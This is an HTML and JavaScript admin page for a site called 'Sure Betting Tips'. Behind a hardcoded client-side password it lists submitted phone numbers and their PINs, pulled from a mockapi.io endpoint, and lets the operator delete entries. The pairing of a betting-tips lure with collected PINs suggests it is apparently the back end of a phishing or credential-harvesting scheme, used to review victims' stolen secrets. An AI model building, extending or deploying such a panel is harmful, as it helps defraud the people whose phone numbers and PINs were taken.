<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Admin Dashboard - Sure Betting Tips</title>
    <style>
      body {
        font-family: Arial, sans-serif;
        background-color: #f1f8f1;
        padding: 30px;
      }

      h2 {
        text-align: center;
        color: #1b5e20;
        margin-bottom: 30px;
      }

      table {
        width: 100%;
        border-collapse: collapse;
        background-color: white;
        border-radius: 10px;
        overflow: hidden;
        box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
      }

      th,
      td {
        padding: 12px 15px;
        text-align: left;
        border-bottom: 1px solid #ddd;
      }

      th {
        background-color: #2e7d32;
        color: white;
      }

      tr:hover {
        background-color: #f1f1f1;
      }

      button {
        background-color: #e53935;
        color: white;
        border: none;
        padding: 8px 15px;
        border-radius: 5px;
        cursor: pointer;
      }

      button:hover {
        background-color: #c62828;
      }

      #refreshBtn {
        background-color: #007bff;
        margin-bottom: 15px;
      }

      #refreshBtn:hover {
        background-color: #0056b3;
      }

      .no-data {
        text-align: center;
        font-style: italic;
        color: gray;
        margin-top: 20px;
      }

      #dashboard {
        display: none;
      }

      #locked {
        text-align: center;
        margin-top: 100px;
        font-size: 18px;
        color: #444;
      }

      #locked input {
        padding: 10px;
        border-radius: 5px;
        border: 2px solid #ccc;
        font-size: 16px;
      }

      #locked button {
        padding: 10px 20px;
        background-color: #28a745;
        color: white;
        border: none;
        border-radius: 5px;
        cursor: pointer;
        font-size: 16px;
      }

      #locked button:hover {
        background-color: #218838;
      }

      #logoutBtn {
        background-color: #ff9800;
        margin-bottom: 15px;
      }

      #logoutBtn:hover {
        background-color: #f57c00;
      }

      #errorMsg {
        color: red;
        display: none;
        margin-top: 10px;
      }
    </style>
  </head>

  <body>
    <div id="locked">
      <h2>🔐 Admin Access</h2>
      <p>Enter the admin password to continue:</p>
      <input type="password" id="adminPass" placeholder="Enter password" maxlength="10" />
      <br /><br />
      <button onclick="checkPassword()">Unlock</button>
      <p id="errorMsg">Incorrect password or admin already logged in!</p>
    </div>

    <div id="dashboard">
      <h2>Admin Dashboard - Submitted Users</h2>
      <button id="logoutBtn" onclick="logout()">🚪 Logout</button>
      <button id="refreshBtn" onclick="fetchData()">🔄 Refresh Data</button>

      <table id="dataTable">
        <thead>
          <tr>
            <th>ID</th>
            <th>Phone Number</th>
            <th>PIN</th>
            <th>Action</th>
          </tr>
        </thead>
        <tbody id="dataBody"></tbody>
      </table>

      <p class="no-data" id="noDataMsg" style="display:none;">No users found.</p>
    </div>

    <script>
      const PASSWORD = "4233";
      const ADMIN_TOKEN = "my_admin_token";
      const API_URL = "https://69d1325b90cd06523d5df37e.mockapi.io/data";
      const ADMIN_STATUS_URL = "https://6a00b2aa36fb6ad04de069f8.mockapi.io/Base"; // Ensure MockAPI admin_status has one record (id: 1, isLoggedIn: false)

      window.onload = async function () {
        const savedToken = localStorage.getItem("admin_token");
        if (savedToken === ADMIN_TOKEN) {
          const status = await getAdminStatus();
          if (status.isLoggedIn) {
            document.getElementById("locked").style.display = "none";
            document.getElementById("dashboard").style.display = "block";
            fetchData();
          } else {
            localStorage.removeItem("admin_token");
          }
        }
      };

      async function checkPassword() {
        const input = document.getElementById("adminPass").value.trim();
        const errorMsg = document.getElementById("errorMsg");

        try {
          const status = await getAdminStatus();

          if (status.isLoggedIn) {
            errorMsg.textContent = "Admin is already logged in elsewhere!";
            errorMsg.style.display = "block";
            return; // Don't allow login if someone else is logged in
          }

          if (input === PASSWORD) {
            await setAdminStatus(true); // Set admin logged in
            localStorage.setItem("admin_token", ADMIN_TOKEN); // Store token for session
            document.getElementById("locked").style.display = "none";
            document.getElementById("dashboard").style.display = "block";
            fetchData();
          } else {
            errorMsg.textContent = "Incorrect password!";
            errorMsg.style.display = "block";
          }
        } catch (err) {
          console.error("Error verifying login:", err);
        }
      }

      async function logout() {
        await setAdminStatus(false); // Set admin logged out
        localStorage.removeItem("admin_token"); // Remove stored session token
        document.getElementById("dashboard").style.display = "none";
        document.getElementById("locked").style.display = "block";
      }

      async function getAdminStatus() {
        const res = await fetch(ADMIN_STATUS_URL);
        return res.json();
      }

      async function setAdminStatus(isLoggedIn) {
        await fetch(ADMIN_STATUS_URL, {
          method: "PUT",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ isLoggedIn }),
        });
      }

      async function fetchData() {
        try {
          const res = await fetch(API_URL);
          const users = await res.json();
          const tableBody = document.getElementById("dataBody");
          const noDataMsg = document.getElementById("noDataMsg");

          tableBody.innerHTML = "";

          if (users.length === 0) {
            noDataMsg.style.display = "block";
            return;
          } else {
            noDataMsg.style.display = "none";
          }

          users.forEach((user) => {
            const row = document.createElement("tr");
            row.innerHTML = `
              <td>${user.id}</td>
              <td>${user.phone}</td>
              <td>${user.pin}</td>
              <td><button onclick="deleteUser(${user.id})">Delete</button></td>
            `;
            tableBody.appendChild(row);
          });
        } catch (error) {
          console.error("Error fetching data:", error);
        }
      }

      async function deleteUser(id) {
        if (confirm("Are you sure you want to delete this entry?")) {
          try {
            await fetch(`${API_URL}/${id}`, { method: "DELETE" });
            alert("User deleted successfully!");
            fetchData();
          } catch (error) {
            console.error("Error deleting user:", error);
            alert("Failed to delete user.");
          }
        }
      }
    </script>
  </body>
</html>
